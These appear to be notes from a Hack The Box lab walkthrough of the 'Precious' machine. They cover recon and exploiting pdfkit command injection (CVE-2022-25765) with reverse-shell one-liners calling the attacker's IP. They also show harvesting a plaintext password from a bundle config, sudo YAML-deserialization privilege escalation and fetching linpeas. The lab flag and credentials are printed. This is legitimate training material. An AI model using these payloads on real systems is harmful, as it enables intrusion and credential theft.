- navigating to htb provided ip redirects http://precious.htb but does not resolve
	- Adding ip address and domain to /etc/hosts fixes this.

- nmap for open ports 
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ nmap -p- -T4 --open -vvv -Pn -oN preciousNmap.txt precious.htb 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:48 EST
Initiating Connect Scan at 09:48
Scanning precious.htb (10.10.11.189) [65535 ports]
Discovered open port 22/tcp on 10.10.11.189
Discovered open port 80/tcp on 10.10.11.189
Completed Connect Scan at 09:49, 16.78s elapsed (65535 total ports)
Nmap scan report for precious.htb (10.10.11.189)
Host is up, received user-set (0.059s latency).
Scanned at 2024-11-11 09:48:47 EST for 16s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds`
```

- nmap for services and versions on those ports
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ nmap -p 22,80 -sC -sV  precious.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-11 09:50 EST
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Convert Web Page to PDF
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
```

- GoBuster does not reveal any additional pages

- Navigating now to precious.htb reveals a Website to pdf service.
- ![[Pasted image 20241111102523.png]]
- trying outside websites yields error
- trying command injection yields no result

- using nc listener and pointing the page at my kali attack machine yields a connection
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.189] 48204
GET / HTTP/1.1
Host: 10.10.14.8:8080
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/10.0 Safari/602.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
```
- ![[Pasted image 20241111104131.png]]

- killing nc then
- spinning up a quick python server 
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ python3 -m http.server 6969         
Serving HTTP on 0.0.0.0 port 6969 (http://0.0.0.0:6969/) ...
10.10.11.189 - - [11/Nov/2024 10:45:41] "GET / HTTP/1.1" 200 -
```
- Then submit http://10.10.14.8:6969 to the page 
- ![[Pasted image 20241111112623.png]]
- which creates a document for us to run exiftool and extract metadata
	- Generated by pdfkit v0.8.6
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool 6a8fsoo0847ba791gq32zfni367hd85o.pdf
ExifTool Version Number         : 12.76
File Name                       : 6a8fsoo0847ba791gq32zfni367hd85o.pdf
Directory                       : .
File Size                       : 20 kB
File Modification Date/Time     : 2024:11:11 10:45:41-05:00
File Access Date/Time           : 2024:11:11 10:45:41-05:00
File Inode Change Date/Time     : 2024:11:11 10:45:41-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

- searchsploit for exploit associated with pdfkit v0.8.6
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ searchsploit pdfkit
------------------------------------ ---------------------------------
 Exploit Title                            |  Path
------------------------------------ ---------------------------------
pdfkit v0.8.7.2 - Command Injection       | ruby/local/51293.py
------------------------------------ ---------------------------------
Shellcodes: No Results
```

- viewing and running the script
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ python3 51293.py                      

UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection

Usage:
  python3 exploit-CVE-2022–25765.py -c <command>
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
  python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -h

Options:
  -c    Custom command mode. Provide command to generate custom payload with.
  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
  -w    URL of website running vulnerable pdfkit. (Optional)
  -p    POST parameter on website running vulnerable pdfkit. (Optional)
  -h    Show this help menu.
```

- Running the script 51293.py generates a command injection one-liner.
	- It is written in Ruby but can be swapped out for your favorite revshell one liner after %20
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ python3 51293.py -s 10.10.11.189 42069


        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.11.189","42069"))'`
LOCALIP: 10.10.11.189:42069
WARNING: Be sure to start a local listener on the above IP and port.
EXPLOIT: Copy the payload above into a PDFKit.new().to_pdf Ruby function or any application running vulnerable pdfkit.
```
- I started a nc listener and used bash
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ nc -lnvp 42069             
listening on [any] 42069 ...
```
- and used bash
```
http://%20\`bash -c 'exec bash -i &>/dev/tcp/10.10.14.5/42069 <&1'
```
- ![[Pasted image 20241111115202.png]]
```bash
┌──(kali㉿kali)-[~/htb/precious]
└─$ nc -lnvp 42069             
listening on [any] 42069 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.189] 37550
bash: cannot set terminal process group (676): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ whoami
whoami
ruby
ruby@precious:/var/www/pdfapp$
```

- digging through random files in the entry point directory and then home directory, we find henry's username and password - henry:Q3c1AqGHtoI0aXAYFH
```bash
ruby@precious:/var/www/pdfapp$ find . -type f
./public/stylesheets/style.css
./config.ru
./config/environment.rb
./Gemfile
./app/views/index.erb
./app/controllers/pdf.rb
./Gemfile.lock
ruby@precious:/var/www/pdfapp$ cd 
ruby@precious:~$ find . -type f
./.bundle/config
./.profile
./.cache/fontconfig/CACHEDIR.TAG
./.cache/fontconfig/8750a791-6268-4630-a416-eea4309e7c79-le64.cache-7
./.cache/fontconfig/ef96da78-736b-4d54-855c-6cd6306b88f9-le64.cache-7
./.cache/fontconfig/7fbdb48c-391b-4ace-afa2-3f01182fb901-le64.cache-7
./.cache/fontconfig/cb67f001-8986-4483-92bd-8d975c0d33c3-le64.cache-7
./.bash_logout
./.bashrc
ruby@precious:~$ cat ./.bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

- ssh in as henry on local host with password given
```bash
ruby@precious:~$ ssh henry@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:kRywGtzD4AwSK3m1ALIMjgI7W2SqImzsG5qPcTSavFU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
henry@localhost's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ 
```

- looking through files in Henry's home directory and he has a user.txt file
```bash
henry@precious:~$ ls -aslp
total 24
4 drwxr-xr-x 2 henry henry 4096 Oct 26  2022 ./
4 drwxr-xr-x 4 root  root  4096 Oct 26  2022 ../
0 lrwxrwxrwx 1 root  root     9 Sep 26  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 henry henry  220 Sep 26  2022 .bash_logout
4 -rw-r--r-- 1 henry henry 3526 Sep 26  2022 .bashrc
4 -rw-r--r-- 1 henry henry  807 Sep 26  2022 .profile
4 -rw-r----- 1 root  henry   33 Nov 16 12:13 user.txt
henry@precious:~$ cat user.txt
fc9972e894315dab7d5d5227b52fa0b2
```

- running sudo -l, we find that henry can run the following command as root without a password.
```bash
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
- reviewing /opt/update_dependencies.rb we find that it loads a file called dependencies.yml. 
- Our goal is to run `sudo /usr/bin/ruby /opt/update_dependencies.rb` with a malicious dependencies.yml.
- There is a malicious script here https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/ that will execute git set: 
- create a dependencies.yml in henry's home directory
- paste the malicious script in dependencies.yml
- change git set: /bin/bash and save
- run `sudo /usr/bin/ruby /opt/update_dependencies.rb`
- should be root


- Bringing linpeas on to vulnerable machine to help exploitation
	- with a reverse shell running over a python simple server at port 6969
	- on attack machine 
		- `wget -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
		- start a simple python server on port 6969
		- `$ python3 -m http.server 6969`
	- on target machine 
		- navigate to /tmp
		- curl it down and run from attack machine
```bash
$ wget http://attack machine ip:port/linpeas.sh
$ chmod 777 linpeas.sh
$ ./linpeas.sh | tee /tmp/linpeas.txt
```
